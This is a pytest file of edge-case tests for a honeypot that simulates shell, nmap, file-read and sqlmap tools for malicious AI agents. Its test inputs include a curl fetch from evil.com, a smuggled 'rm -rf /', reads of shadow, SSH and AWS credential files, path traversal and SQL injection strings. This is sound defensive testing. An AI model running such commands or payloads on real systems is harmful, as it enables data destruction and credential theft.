"""Negative and edge-case tests for honeypot simulators.

Covers boundary conditions, missing arguments, invalid inputs, and
adversarial payloads that a malicious AI agent might send to probe
or break the simulator layer.
"""

import pytest

from shared.db import get_connection


# ---------------------------------------------------------------------------
# ShellExecSimulator
# ---------------------------------------------------------------------------


class TestShellExecEdgeCases:
    """Edge cases for the shell_exec simulator."""

    def test_empty_command_string(self, registry, session_id):
        """An empty command string should be treated as an error.
        The simulator returns is_error=True. The engagement engine may
        append breadcrumbs to the raw output, so we only check is_error."""
        result = registry.dispatch("shell_exec", {"command": ""}, session_id)
        assert result.is_error is True

    def test_missing_command_key(self, registry, session_id):
        """Omitting the 'command' key entirely should behave like an empty command."""
        result = registry.dispatch("shell_exec", {}, session_id)
        assert result.is_error is True

    def test_whitespace_only_command(self, registry, session_id):
        """A command containing only whitespace should be treated as empty/error."""
        result = registry.dispatch("shell_exec", {"command": "   "}, session_id)
        assert result.is_error is True

    def test_tabs_and_newlines_only(self, registry, session_id):
        """A command with only tab and newline characters should be treated as empty."""
        result = registry.dispatch("shell_exec", {"command": "\t\n\r"}, session_id)
        assert result.is_error is True

    def test_command_exceeding_max_length(self, registry, session_id):
        """A command exceeding 4096 characters should return a length error."""
        long_command = "a" * 4097
        result = registry.dispatch("shell_exec", {"command": long_command}, session_id)
        assert result.is_error is True
        assert "command too long" in result.output
        assert "4096" in result.output

    def test_command_at_exact_max_length(self, registry, session_id):
        """A command at exactly 4096 characters should NOT be rejected for length."""
        # 4096-char command: a valid command padded with spaces
        command = "whoami" + " " * (4096 - len("whoami"))
        result = registry.dispatch("shell_exec", {"command": command}, session_id)
        # Should not be rejected as too long
        assert "command too long" not in result.output

    def test_command_one_over_max_length(self, registry, session_id):
        """A command at 4097 characters should be rejected."""
        command = "x" * 4097
        result = registry.dispatch("shell_exec", {"command": command}, session_id)
        assert result.is_error is True
        assert "command too long" in result.output

    def test_command_well_under_max_length(self, registry, session_id):
        """A short command should be processed normally."""
        result = registry.dispatch("shell_exec", {"command": "whoami"}, session_id)
        assert result.is_error is False
        assert "command too long" not in result.output

    def test_unparseable_shell_quoting(self, registry, session_id):
        """Unmatched quotes should not crash; shlex falls back to str.split."""
        result = registry.dispatch(
            "shell_exec", {"command": "echo 'unterminated"}, session_id
        )
        # shlex.split raises ValueError on unmatched quote, code falls back to
        # command.split(), so "echo" becomes the base command.
        # "echo" is not in the dispatch table so it should be "command not found".
        assert result.is_error is False
        assert "command not found" in result.output

    def test_deeply_nested_quoting(self, registry, session_id):
        """Deeply nested quoting should not cause excessive processing."""
        result = registry.dispatch(
            "shell_exec",
            {"command": """bash -c "echo 'hello \"world\"'" """},
            session_id,
        )
        # Should produce some output without crashing
        assert isinstance(result.output, str)

    def test_null_bytes_in_command(self, registry, session_id):
        """Null bytes embedded in the command should not crash the simulator."""
        result = registry.dispatch(
            "shell_exec", {"command": "whoami\x00--help"}, session_id
        )
        assert isinstance(result.output, str)

    def test_unknown_command_zero_escalation(self, registry, session_id, session_manager):
        """Unknown commands should NOT increase escalation level."""
        registry.dispatch(
            "shell_exec", {"command": "doesnotexist"}, session_id
        )
        ctx = session_manager.get(session_id)
        assert ctx.escalation_level == 0

    def test_dangerous_but_unknown_command_no_escalation(
        self, registry, session_id, session_manager
    ):
        """Dangerous commands NOT in the dispatch table (e.g. curl) get their
        escalation explicitly reset to 0. This is current behavior: the
        'command not found' branch overrides the DANGEROUS_COMMANDS check."""
        result = registry.dispatch(
            "shell_exec",
            {"command": "curl http://evil.com/payload"},
            session_id,
        )
        # curl is not a recognized handler, so output says "command not found"
        assert "command not found" in result.output
        ctx = session_manager.get(session_id)
        # Escalation is 0 because the unknown-command branch resets it
        assert ctx.escalation_level == 0

    def test_full_path_dangerous_but_unknown_command(
        self, registry, session_id, session_manager
    ):
        """Even with a full path, a dangerous command not in the dispatch table
        gets 'command not found' and zero escalation."""
        result = registry.dispatch(
            "shell_exec",
            {"command": "/usr/bin/curl http://evil.com"},
            session_id,
        )
        assert "command not found" in result.output
        ctx = session_manager.get(session_id)
        assert ctx.escalation_level == 0

    def test_known_dangerous_command_docker_escalates(
        self, registry, session_id, session_manager
    ):
        """Docker IS in both DANGEROUS_COMMANDS and the dispatch table, so it
        should produce valid output AND increase escalation."""
        # Note: "docker" is in the dispatch table (shell_exec.py line 96)
        # but docker is NOT in DANGEROUS_COMMANDS set. Let's verify by
        # checking that docker ps works without escalation.
        result = registry.dispatch(
            "shell_exec", {"command": "docker ps"}, session_id
        )
        assert "CONTAINER ID" in result.output
        # docker is not in DANGEROUS_COMMANDS so escalation should be 0
        ctx = session_manager.get(session_id)
        assert ctx.escalation_level == 0

    def test_ls_nonexistent_directory(self, registry, session_id):
        """Listing a directory not in the pre-defined set should return an error message."""
        result = registry.dispatch(
            "shell_exec", {"command": "ls /opt/secret"}, session_id
        )
        assert "No such file or directory" in result.output

    def test_cat_without_file_argument(self, registry, session_id):
        """Running 'cat' with no file argument should return empty string from handler.
        The engagement engine may append breadcrumbs, so we check the output starts
        with empty or contains only breadcrumb content."""
        result = registry.dispatch("shell_exec", {"command": "cat"}, session_id)
        # The _cat handler returns "" when len(parts) < 2.
        # After enrichment, the output may have a breadcrumb appended.
        # The core behavior: no error, no "command not found"
        assert result.is_error is False
        assert "command not found" not in result.output

    # --- Additional edge cases ---

    def test_command_with_shell_operators_only(self, registry, session_id):
        """A command that is only shell operators should not crash.
        shlex.split handles these, but the resulting base_cmd is a punctuation
        token which won't be in the dispatch table."""
        result = registry.dispatch(
            "shell_exec", {"command": "&&"}, session_id
        )
        assert isinstance(result.output, str)
        # Should not crash; the base command is "&&" which is not dispatched
        assert result.is_error is False

    def test_command_with_pipe_only(self, registry, session_id):
        """A pipe character alone should not crash the simulator."""
        result = registry.dispatch(
            "shell_exec", {"command": "|"}, session_id
        )
        assert isinstance(result.output, str)
        assert result.is_error is False

    def test_command_with_semicolons(self, registry, session_id):
        """Multiple semicolons (command chaining attempt) should parse but
        only the first token matters for dispatch."""
        result = registry.dispatch(
            "shell_exec", {"command": "whoami; id; uname"}, session_id
        )
        # shlex.split gives ["whoami;", "id;", "uname"]
        # base_cmd is "whoami;" which is not in dispatch, OR shlex may
        # split differently. Either way it should not crash.
        assert isinstance(result.output, str)

    def test_command_with_backtick_substitution(self, registry, session_id):
        """Backtick command substitution should be parsed safely."""
        result = registry.dispatch(
            "shell_exec", {"command": "echo `whoami`"}, session_id
        )
        assert isinstance(result.output, str)
        assert result.is_error is False

    def test_command_with_dollar_substitution(self, registry, session_id):
        """Dollar-paren command substitution should not crash."""
        result = registry.dispatch(
            "shell_exec", {"command": "echo $(cat /etc/passwd)"}, session_id
        )
        assert isinstance(result.output, str)

    def test_command_with_unicode_characters(self, registry, session_id):
        """Unicode characters in command should not crash the simulator."""
        result = registry.dispatch(
            "shell_exec", {"command": "echo cafe\u0301"}, session_id
        )
        assert isinstance(result.output, str)

    def test_command_with_carriage_return_injection(self, registry, session_id):
        """Carriage return characters embedded in command should not cause issues."""
        result = registry.dispatch(
            "shell_exec", {"command": "whoami\r\nid"}, session_id
        )
        assert isinstance(result.output, str)

    def test_command_with_working_dir_argument(self, registry, session_id):
        """Providing a working_dir argument should not crash even though
        the simulator does not use it for dispatch logic."""
        result = registry.dispatch(
            "shell_exec",
            {"command": "ls", "working_dir": "/tmp"},
            session_id,
        )
        assert isinstance(result.output, str)
        assert result.is_error is False

    def test_command_with_path_traversal_working_dir(self, registry, session_id):
        """Path traversal in working_dir should not crash the simulator.
        The current implementation does not use working_dir for anything,
        but it should still accept it without error."""
        result = registry.dispatch(
            "shell_exec",
            {"command": "ls", "working_dir": "../../../../etc"},
            session_id,
        )
        assert isinstance(result.output, str)
        assert result.is_error is False

    def test_command_with_all_mismatched_quotes(self, registry, session_id):
        """Multiple mismatched quotes should fall back to str.split gracefully."""
        result = registry.dispatch(
            "shell_exec",
            {"command": """echo "hello 'world" 'test"""},
            session_id,
        )
        assert isinstance(result.output, str)

    def test_ip_subcommand_addr(self, registry, session_id):
        """'ip addr' should return network interface information."""
        result = registry.dispatch(
            "shell_exec", {"command": "ip addr"}, session_id
        )
        assert "10.0.1.10" in result.output
        assert result.is_error is False

    def test_ip_subcommand_route(self, registry, session_id):
        """'ip route' should return routing table information."""
        result = registry.dispatch(
            "shell_exec", {"command": "ip route"}, session_id
        )
        assert "default" in result.output
        assert result.is_error is False

    def test_ip_without_subcommand(self, registry, session_id):
        """'ip' alone should return usage information."""
        result = registry.dispatch(
            "shell_exec", {"command": "ip"}, session_id
        )
        assert "Usage" in result.output

    def test_docker_images(self, registry, session_id):
        """'docker images' should return image listing."""
        result = registry.dispatch(
            "shell_exec", {"command": "docker images"}, session_id
        )
        assert "REPOSITORY" in result.output
        assert "node" in result.output

    def test_docker_without_subcommand(self, registry, session_id):
        """'docker' alone should return usage information."""
        result = registry.dispatch(
            "shell_exec", {"command": "docker"}, session_id
        )
        assert "Usage" in result.output

    def test_crontab_without_flag(self, registry, session_id):
        """'crontab' without -l should return usage information."""
        result = registry.dispatch(
            "shell_exec", {"command": "crontab"}, session_id
        )
        assert "usage" in result.output.lower()

    def test_uname_without_flag(self, registry, session_id):
        """'uname' without -a should return just 'Linux'."""
        result = registry.dispatch(
            "shell_exec", {"command": "uname"}, session_id
        )
        assert result.output.strip().startswith("Linux")
        assert "x86_64" not in result.output

    def test_ss_is_alias_for_netstat(self, registry, session_id):
        """'ss' should produce the same output as 'netstat'."""
        result_ss = registry.dispatch(
            "shell_exec", {"command": "ss"}, session_id
        )
        result_ns = registry.dispatch(
            "shell_exec", {"command": "netstat"}, session_id
        )
        # Both should contain LISTEN entries; exact match not guaranteed due
        # to engagement engine breadcrumbs, but structure should be the same
        assert "LISTEN" in result_ss.output
        assert "LISTEN" in result_ns.output

    def test_printenv_is_alias_for_env(self, registry, session_id):
        """'printenv' should produce the same base output as 'env'."""
        result = registry.dispatch(
            "shell_exec", {"command": "printenv"}, session_id
        )
        assert "NODE_ENV=production" in result.output
        assert "DATABASE_URL" in result.output

    def test_command_with_very_long_single_argument(self, registry, session_id):
        """A known command followed by a very long argument should not crash,
        as long as total length is under the 4096 limit."""
        long_arg = "A" * 4000
        result = registry.dispatch(
            "shell_exec", {"command": f"ls {long_arg}"}, session_id
        )
        # ls handler will get the long arg as a directory path which doesn't
        # match any known directory
        assert "No such file or directory" in result.output

    def test_command_with_null_byte_between_tokens(self, registry, session_id):
        """Null byte between command and argument should be handled gracefully."""
        result = registry.dispatch(
            "shell_exec", {"command": "ls\x00-la"}, session_id
        )
        assert isinstance(result.output, str)
        assert result.is_error is False


# ---------------------------------------------------------------------------
# NmapSimulator
# ---------------------------------------------------------------------------


class TestNmapEdgeCases:
    """Edge cases for the nmap_scan simulator."""

    def test_missing_target_argument(self, registry, session_id):
        """Omitting 'target' entirely should fall back to the default (127.0.0.1)
        and still produce valid nmap output."""
        result = registry.dispatch("nmap_scan", {}, session_id)
        assert "Nmap" in result.output
        assert result.is_error is False

    def test_empty_target_string(self, registry, session_id, session_manager):
        """An empty target string should still produce nmap-like output without crashing."""
        result = registry.dispatch("nmap_scan", {"target": ""}, session_id)
        assert "Nmap" in result.output
        assert result.is_error is False
        # Empty string target should be added to hosts via session.add_host
        ctx = session_manager.get(session_id)
        assert "" in ctx.discovered_hosts

    def test_target_with_slash_treated_as_cidr(self, registry, session_id, session_manager):
        """Any target containing '/' is treated as a CIDR range, producing multi-host output."""
        result = registry.dispatch("nmap_scan", {"target": "garbage/stuff"}, session_id)
        ctx = session_manager.get(session_id)
        # CIDR branch returns first 3 INTERNAL_HOSTS keys
        assert len(ctx.discovered_hosts) >= 2

    def test_invalid_scan_type_uses_default_ports(self, registry, session_id):
        """An unrecognized scan_type should use the non-quick port list."""
        result = registry.dispatch(
            "nmap_scan",
            {"target": "10.0.1.10", "scan_type": "nonexistent"},
            session_id,
        )
        # scan_type != "quick" means all DEFAULT_PORTS are shown
        assert "6379" in result.output  # redis port, only in full list
        assert "Nmap" in result.output

    def test_quick_scan_limits_ports(self, registry, session_id):
        """Quick scan should only show the first 4 default ports."""
        result = registry.dispatch(
            "nmap_scan",
            {"target": "10.0.1.10", "scan_type": "quick"},
            session_id,
        )
        # Port 6379 (redis) is at index 4, should NOT appear in quick scan
        assert "6379" not in result.output
        # But port 22 (index 0) should appear
        assert "22/tcp" in result.output

    def test_nmap_always_escalates(self, registry, session_id, session_manager):
        """Every nmap scan should contribute to escalation."""
        registry.dispatch("nmap_scan", {"target": "10.0.1.10"}, session_id)
        ctx = session_manager.get(session_id)
        assert ctx.escalation_level >= 1

    def test_external_ip_target(self, registry, session_id, session_manager):
        """Scanning an IP not in INTERNAL_HOSTS should still work but show 'unknown-host'."""
        result = registry.dispatch(
            "nmap_scan", {"target": "192.168.99.99"}, session_id
        )
        assert "unknown-host" in result.output
        ctx = session_manager.get(session_id)
        assert "192.168.99.99" in ctx.discovered_hosts

    # --- Additional edge cases ---

    def test_extremely_long_target_string(self, registry, session_id):
        """An extremely long target string should not crash the simulator."""
        long_target = "A" * 10000
        result = registry.dispatch(
            "nmap_scan", {"target": long_target}, session_id
        )
        assert "Nmap" in result.output
        assert result.is_error is False

    def test_target_with_newline_characters(self, registry, session_id):
        """Newline characters in the target should not crash."""
        result = registry.dispatch(
            "nmap_scan", {"target": "10.0.1.10\n10.0.1.20"}, session_id
        )
        assert "Nmap" in result.output
        assert isinstance(result.output, str)

    def test_target_with_null_bytes(self, registry, session_id):
        """Null bytes in the target should not crash."""
        result = registry.dispatch(
            "nmap_scan", {"target": "10.0.1.10\x0010.0.1.20"}, session_id
        )
        assert isinstance(result.output, str)
        assert result.is_error is False

    def test_target_with_unicode_characters(self, registry, session_id):
        """Unicode characters in target should not crash."""
        result = registry.dispatch(
            "nmap_scan", {"target": "10.0.1.10\u202e"}, session_id
        )
        assert isinstance(result.output, str)
        assert result.is_error is False

    def test_target_with_special_characters(self, registry, session_id):
        """Special characters like semicolons, pipes in target should not crash."""
        result = registry.dispatch(
            "nmap_scan", {"target": "10.0.1.10; rm -rf /"}, session_id
        )
        assert isinstance(result.output, str)
        assert result.is_error is False

    def test_ipv6_target(self, registry, session_id, session_manager):
        """An IPv6 address target should be handled gracefully as unknown-host."""
        result = registry.dispatch(
            "nmap_scan", {"target": "::1"}, session_id
        )
        assert "Nmap" in result.output
        assert "unknown-host" in result.output
        ctx = session_manager.get(session_id)
        assert "::1" in ctx.discovered_hosts

    def test_valid_cidr_range(self, registry, session_id, session_manager):
        """A valid CIDR notation should trigger multi-host scanning."""
        result = registry.dispatch(
            "nmap_scan", {"target": "10.0.1.0/24"}, session_id
        )
        ctx = session_manager.get(session_id)
        # CIDR branch returns first 3 internal hosts
        assert len(ctx.discovered_hosts) == 3

    def test_hostname_target(self, registry, session_id, session_manager):
        """A hostname target should be treated as a single host with unknown-host."""
        result = registry.dispatch(
            "nmap_scan", {"target": "evil.example.com"}, session_id
        )
        assert "unknown-host" in result.output
        ctx = session_manager.get(session_id)
        assert "evil.example.com" in ctx.discovered_hosts

    def test_service_scan_shows_versions(self, registry, session_id):
        """Service scan type should include version information in output."""
        result = registry.dispatch(
            "nmap_scan",
            {"target": "10.0.1.10", "scan_type": "service"},
            session_id,
        )
        assert "OpenSSH" in result.output or "nginx" in result.output

    def test_full_scan_shows_all_ports(self, registry, session_id):
        """Full scan type should show all default ports including filtered ones."""
        result = registry.dispatch(
            "nmap_scan",
            {"target": "10.0.1.10", "scan_type": "full"},
            session_id,
        )
        assert "6379" in result.output  # redis, filtered port
        assert "filtered" in result.output

    def test_ports_argument_accepted(self, registry, session_id):
        """The ports argument should be accepted without error even though
        the simulator does not use it for filtering."""
        result = registry.dispatch(
            "nmap_scan",
            {"target": "10.0.1.10", "ports": "1-65535"},
            session_id,
        )
        assert "Nmap" in result.output
        assert result.is_error is False

    def test_internal_host_shows_correct_hostname(self, registry, session_id):
        """An internal host IP should show its mapped hostname."""
        result = registry.dispatch(
            "nmap_scan", {"target": "10.0.1.30"}, session_id
        )
        assert "db-primary-01" in result.output

    def test_nmap_scan_tracks_ports_in_session(self, registry, session_id, session_manager):
        """Scanning should add discovered ports to the session context."""
        registry.dispatch(
            "nmap_scan",
            {"target": "10.0.1.10", "scan_type": "full"},
            session_id,
        )
        ctx = session_manager.get(session_id)
        # Should have ports from the scan
        assert len(ctx.discovered_ports) > 0
        port_numbers = [p["port"] for p in ctx.discovered_ports]
        assert 22 in port_numbers
        assert 80 in port_numbers

    def test_whitespace_only_target(self, registry, session_id):
        """A target that is only whitespace should not crash."""
        result = registry.dispatch(
            "nmap_scan", {"target": "   "}, session_id
        )
        assert "Nmap" in result.output
        assert result.is_error is False


# ---------------------------------------------------------------------------
# FileReadSimulator
# ---------------------------------------------------------------------------


class TestFileReadEdgeCases:
    """Edge cases for the file_read simulator."""

    def test_missing_path_argument(self, registry, session_id):
        """Omitting 'path' entirely should default to empty string and return not-found."""
        result = registry.dispatch("file_read", {}, session_id)
        assert result.is_error is True
        assert "No such file or directory" in result.output

    def test_empty_path_string(self, registry, session_id, session_manager):
        """An empty path string should return not-found and still track the access."""
        result = registry.dispatch("file_read", {"path": ""}, session_id)
        assert result.is_error is True
        assert "No such file or directory" in result.output
        ctx = session_manager.get(session_id)
        assert "" in ctx.discovered_files

    def test_path_traversal_etc_passwd(self, registry, session_id):
        """Path traversal like '../../etc/passwd' should match via endswith check.
        The dispatch uses exact match first, then endswith; '../../etc/passwd'
        ends with '/etc/passwd' so it matches the handler and returns content."""
        result = registry.dispatch(
            "file_read", {"path": "../../etc/passwd"}, session_id
        )
        # The endswith check in the simulator WILL match because
        # "../../etc/passwd".endswith("/etc/passwd") is True
        assert "root:x:0:0" in result.output
        assert result.is_error is False

    def test_path_traversal_tracked_in_session(self, registry, session_id, session_manager):
        """Path traversal attempts should be recorded as-is in the session."""
        traversal_path = "../../../../etc/passwd"
        registry.dispatch("file_read", {"path": traversal_path}, session_id)
        ctx = session_manager.get(session_id)
        assert traversal_path in ctx.discovered_files

    def test_relative_path_no_match(self, registry, session_id):
        """A relative path that doesn't match any dispatch pattern returns not-found."""
        result = registry.dispatch(
            "file_read", {"path": "../../../tmp/random.txt"}, session_id
        )
        assert result.is_error is True
        assert "No such file or directory" in result.output

    def test_whitespace_path(self, registry, session_id):
        """A path that is only whitespace should return not-found."""
        result = registry.dispatch("file_read", {"path": "   "}, session_id)
        assert result.is_error is True
        assert "No such file or directory" in result.output

    def test_etc_shadow_always_denied(self, registry, session_id):
        """Reading /etc/shadow should always return Permission denied."""
        result = registry.dispatch("file_read", {"path": "/etc/shadow"}, session_id)
        assert result.is_error is True
        assert "Permission denied" in result.output

    def test_traversal_to_shadow_via_endswith(self, registry, session_id):
        """Path traversal ending in /etc/shadow should match the shadow handler."""
        result = registry.dispatch(
            "file_read", {"path": "../../../../etc/shadow"}, session_id
        )
        assert result.is_error is True
        assert "Permission denied" in result.output

    def test_multiple_reads_track_all_files(self, registry, session_id, session_manager):
        """Multiple file reads should accumulate unique entries in discovered_files."""
        registry.dispatch("file_read", {"path": "/etc/passwd"}, session_id)
        registry.dispatch("file_read", {"path": "/nonexistent"}, session_id)
        registry.dispatch("file_read", {"path": "/etc/passwd"}, session_id)  # duplicate

        ctx = session_manager.get(session_id)
        assert "/etc/passwd" in ctx.discovered_files
        assert "/nonexistent" in ctx.discovered_files
        # Duplicates should not appear
        assert ctx.discovered_files.count("/etc/passwd") == 1

    def test_env_file_via_suffix_match(self, registry, session_id):
        """Any path ending with '.env' should match the .env handler via endswith."""
        result = registry.dispatch(
            "file_read", {"path": "/some/custom/path/.env"}, session_id
        )
        # .endswith(".env") matches the ".env" key in dispatch
        assert "DATABASE_URL" in result.output
        assert result.is_error is False

    # --- Additional edge cases ---

    def test_null_bytes_in_path(self, registry, session_id):
        """Null bytes embedded in the path should not crash the simulator."""
        result = registry.dispatch(
            "file_read", {"path": "/etc/\x00passwd"}, session_id
        )
        assert isinstance(result.output, str)
        # The null byte breaks the path match, so it should be not-found
        assert result.is_error is True
        assert "No such file or directory" in result.output

    def test_extremely_long_path(self, registry, session_id):
        """An extremely long path should not crash the simulator."""
        long_path = "/etc/" + "a" * 10000
        result = registry.dispatch(
            "file_read", {"path": long_path}, session_id
        )
        assert isinstance(result.output, str)
        assert result.is_error is True
        assert "No such file or directory" in result.output

    def test_extremely_long_path_tracked_in_session(self, registry, session_id, session_manager):
        """Even extremely long paths should be tracked in discovered_files."""
        long_path = "/" + "x" * 5000
        registry.dispatch("file_read", {"path": long_path}, session_id)
        ctx = session_manager.get(session_id)
        assert long_path in ctx.discovered_files

    def test_path_with_unicode_characters(self, registry, session_id):
        """Unicode characters in path should not crash."""
        result = registry.dispatch(
            "file_read", {"path": "/etc/\u202e\u0000passwd"}, session_id
        )
        assert isinstance(result.output, str)

    def test_path_with_newlines(self, registry, session_id):
        """Newline characters in path should not crash the simulator."""
        result = registry.dispatch(
            "file_read", {"path": "/etc/passwd\n/etc/shadow"}, session_id
        )
        assert isinstance(result.output, str)

    def test_path_with_backslashes(self, registry, session_id):
        """Windows-style backslashes in path should not match unix paths."""
        result = registry.dispatch(
            "file_read", {"path": "\\etc\\passwd"}, session_id
        )
        assert result.is_error is True
        assert "No such file or directory" in result.output

    def test_double_encoded_path_traversal_still_matches_suffix(self, registry, session_id):
        """URL-encoded prefix with literal /etc/passwd suffix still matches via
        the endswith fallback, because the literal string ends with '/etc/passwd'."""
        result = registry.dispatch(
            "file_read", {"path": "%2e%2e/%2e%2e/etc/passwd"}, session_id
        )
        # The path "%2e%2e/%2e%2e/etc/passwd" ends with "/etc/passwd"
        # so the endswith match triggers the etc_passwd handler
        assert "root:x:0:0" in result.output
        assert result.is_error is False

    def test_fully_encoded_path_no_match(self, registry, session_id):
        """A fully URL-encoded path should not match any dispatch entry."""
        result = registry.dispatch(
            "file_read", {"path": "%2Fetc%2Fpasswd"}, session_id
        )
        # No exact match and endswith won't match encoded slashes
        assert result.is_error is True
        assert "No such file or directory" in result.output

    def test_config_yaml_access(self, registry, session_id):
        """Accessing config.yaml should return configuration content with tokens."""
        result = registry.dispatch(
            "file_read", {"path": "/app/config.yaml"}, session_id
        )
        assert result.is_error is False
        assert "database" in result.output
        assert "admin" in result.output

    def test_config_yaml_escalation(self, registry, session_id, session_manager):
        """Reading config.yaml should increase escalation."""
        registry.dispatch(
            "file_read", {"path": "/app/config.yaml"}, session_id
        )
        ctx = session_manager.get(session_id)
        assert ctx.escalation_level >= 1

    def test_ssh_key_access(self, registry, session_id):
        """Accessing an SSH private key should return key content."""
        result = registry.dispatch(
            "file_read", {"path": "/home/deploy/.ssh/id_rsa"}, session_id
        )
        assert result.is_error is False
        assert result.escalation_delta == 1

    def test_aws_credentials_access(self, registry, session_id):
        """Accessing AWS credentials should return credential content."""
        result = registry.dispatch(
            "file_read", {"path": "/home/deploy/.aws/credentials"}, session_id
        )
        assert result.is_error is False
        assert "default" in result.output
        assert result.escalation_delta == 1

    def test_etc_passwd_content(self, registry, session_id):
        """Reading /etc/passwd should return realistic passwd file content."""
        result = registry.dispatch(
            "file_read", {"path": "/etc/passwd"}, session_id
        )
        assert "root:x:0:0" in result.output
        assert "deploy:x:1000" in result.output
        assert result.escalation_delta == 1

    def test_env_file_generates_honey_tokens(self, config, registry, session_id):
        """Reading .env file should generate honey tokens in the database."""
        registry.dispatch(
            "file_read", {"path": "/app/.env"}, session_id
        )
        with get_connection(config.db_path) as conn:
            tokens = conn.execute(
                "SELECT * FROM honey_tokens WHERE session_id = ?",
                (session_id,),
            ).fetchall()
        # .env handler generates DB_CREDENTIAL, API_TOKEN, and AWS_ACCESS_KEY
        assert len(tokens) >= 3

    def test_env_file_tracks_credentials_in_session(
        self, registry, session_id, session_manager
    ):
        """Reading .env should add credential entries to the session."""
        registry.dispatch(
            "file_read", {"path": "/app/.env"}, session_id
        )
        ctx = session_manager.get(session_id)
        assert len(ctx.discovered_credentials) >= 3

    def test_encoding_argument_accepted(self, registry, session_id):
        """The encoding argument should be accepted without error."""
        result = registry.dispatch(
            "file_read",
            {"path": "/etc/passwd", "encoding": "utf-8"},
            session_id,
        )
        assert result.is_error is False

    def test_path_with_trailing_slash(self, registry, session_id):
        """A path with trailing slash should not match file entries."""
        result = registry.dispatch(
            "file_read", {"path": "/etc/passwd/"}, session_id
        )
        # /etc/passwd/ does not match the dispatch key "/etc/passwd"
        # and doesn't endswith any known pattern
        assert isinstance(result.output, str)

    def test_root_ssh_key_access(self, registry, session_id):
        """Accessing root SSH key should also return key content."""
        result = registry.dispatch(
            "file_read", {"path": "/root/.ssh/id_rsa"}, session_id
        )
        assert result.is_error is False
        assert result.escalation_delta == 1


# ---------------------------------------------------------------------------
# SqlmapSimulator
# ---------------------------------------------------------------------------


class TestSqlmapEdgeCases:
    """Edge cases for the sqlmap_scan simulator."""

    def test_missing_url_argument(self, registry, session_id):
        """Omitting 'url' should default to empty string and still produce output."""
        result = registry.dispatch("sqlmap_scan", {}, session_id)
        assert "testing connection" in result.output
        assert result.is_error is False

    def test_empty_url_string(self, registry, session_id):
        """An empty URL string should still produce the test vulnerability output."""
        result = registry.dispatch(
            "sqlmap_scan", {"url": "", "action": "test"}, session_id
        )
        assert "injectable" in result.output
        assert result.is_error is False

    def test_unknown_action(self, registry, session_id):
        """An unrecognized action should return an 'Unknown action' message."""
        result = registry.dispatch(
            "sqlmap_scan",
            {"url": "http://target/page?id=1", "action": "destroy"},
            session_id,
        )
        assert "Unknown action" in result.output

    def test_tables_without_database(self, registry, session_id):
        """Requesting tables without specifying a database should default to 'production'."""
        result = registry.dispatch(
            "sqlmap_scan",
            {"url": "http://target/page?id=1", "action": "tables"},
            session_id,
        )
        assert "users" in result.output
        assert "production" in result.output

    def test_columns_without_table(self, registry, session_id):
        """Requesting columns without specifying a table should default to 'users'."""
        result = registry.dispatch(
            "sqlmap_scan",
            {"url": "http://target/page?id=1", "action": "columns"},
            session_id,
        )
        assert "email" in result.output
        assert "password_hash" in result.output

    def test_dump_unknown_table(self, registry, session_id):
        """Dumping a table not in the special handlers should return generic sample data."""
        result = registry.dispatch(
            "sqlmap_scan",
            {"url": "http://target/page?id=1", "action": "dump", "table": "audit_log"},
            session_id,
        )
        assert "sample_record" in result.output

    def test_dump_with_nonexistent_database(self, registry, session_id):
        """Specifying a nonexistent database for dump should still work (table dispatch)."""
        result = registry.dispatch(
            "sqlmap_scan",
            {
                "url": "http://target/page?id=1",
                "action": "dump",
                "database": "nonexistent_db",
                "table": "users",
            },
            session_id,
        )
        assert "admin@corp.internal" in result.output

    def test_sqlmap_always_escalates(self, registry, session_id, session_manager):
        """Every sqlmap interaction should increase escalation."""
        registry.dispatch(
            "sqlmap_scan",
            {"url": "http://target/page?id=1", "action": "test"},
            session_id,
        )
        ctx = session_manager.get(session_id)
        assert ctx.escalation_level >= 1

    def test_columns_for_unknown_table(self, registry, session_id):
        """Requesting columns for an unknown table should return a generic column set."""
        result = registry.dispatch(
            "sqlmap_scan",
            {
                "url": "http://target/page?id=1",
                "action": "columns",
                "table": "nonexistent_table",
            },
            session_id,
        )
        # Falls back to ["id", "data", "created_at"]
        assert "id" in result.output
        assert "data" in result.output
        assert "created_at" in result.output

    # --- Additional edge cases ---

    def test_non_http_url_ftp(self, registry, session_id):
        """An ftp:// URL should not crash the simulator."""
        result = registry.dispatch(
            "sqlmap_scan",
            {"url": "ftp://internal.server/data", "action": "test"},
            session_id,
        )
        assert "testing connection" in result.output
        assert result.is_error is False

    def test_non_http_url_file(self, registry, session_id):
        """A file:// URL should not crash the simulator."""
        result = registry.dispatch(
            "sqlmap_scan",
            {"url": "file:///etc/passwd", "action": "test"},
            session_id,
        )
        assert "testing connection" in result.output
        assert result.is_error is False

    def test_javascript_url(self, registry, session_id):
        """A javascript: URL should not crash the simulator."""
        result = registry.dispatch(
            "sqlmap_scan",
            {"url": "javascript:alert(1)", "action": "test"},
            session_id,
        )
        assert isinstance(result.output, str)
        assert result.is_error is False

    def test_extremely_long_url(self, registry, session_id):
        """An extremely long URL should not crash the simulator."""
        long_url = "http://target/page?id=" + "A" * 10000
        result = registry.dispatch(
            "sqlmap_scan",
            {"url": long_url, "action": "test"},
            session_id,
        )
        assert "testing connection" in result.output
        assert result.is_error is False

    def test_url_with_special_characters(self, registry, session_id):
        """A URL containing special characters should not crash."""
        result = registry.dispatch(
            "sqlmap_scan",
            {"url": "http://target/page?id=1' OR '1'='1", "action": "test"},
            session_id,
        )
        assert "testing connection" in result.output

    def test_url_with_null_bytes(self, registry, session_id):
        """Null bytes in URL should not crash the simulator."""
        result = registry.dispatch(
            "sqlmap_scan",
            {"url": "http://target/page\x00?id=1", "action": "test"},
            session_id,
        )
        assert isinstance(result.output, str)

    def test_dump_users_table_generates_tokens(self, config, registry, session_id):
        """Dumping the 'users' table should generate honey tokens."""
        registry.dispatch(
            "sqlmap_scan",
            {"url": "http://target/page?id=1", "action": "dump", "table": "users"},
            session_id,
        )
        with get_connection(config.db_path) as conn:
            tokens = conn.execute(
                "SELECT * FROM honey_tokens WHERE session_id = ?",
                (session_id,),
            ).fetchall()
        assert len(tokens) >= 2  # DB_CREDENTIAL and ADMIN_LOGIN

    def test_dump_admin_users_table(self, registry, session_id):
        """Dumping 'admin_users' table should produce user data with password hashes."""
        result = registry.dispatch(
            "sqlmap_scan",
            {"url": "http://target/page?id=1", "action": "dump", "table": "admin_users"},
            session_id,
        )
        assert "admin@corp.internal" in result.output
        assert "password" in result.output.lower()

    def test_dump_api_keys_table(self, config, registry, session_id):
        """Dumping 'api_keys' table should produce API key data and generate tokens."""
        result = registry.dispatch(
            "sqlmap_scan",
            {"url": "http://target/page?id=1", "action": "dump", "table": "api_keys"},
            session_id,
        )
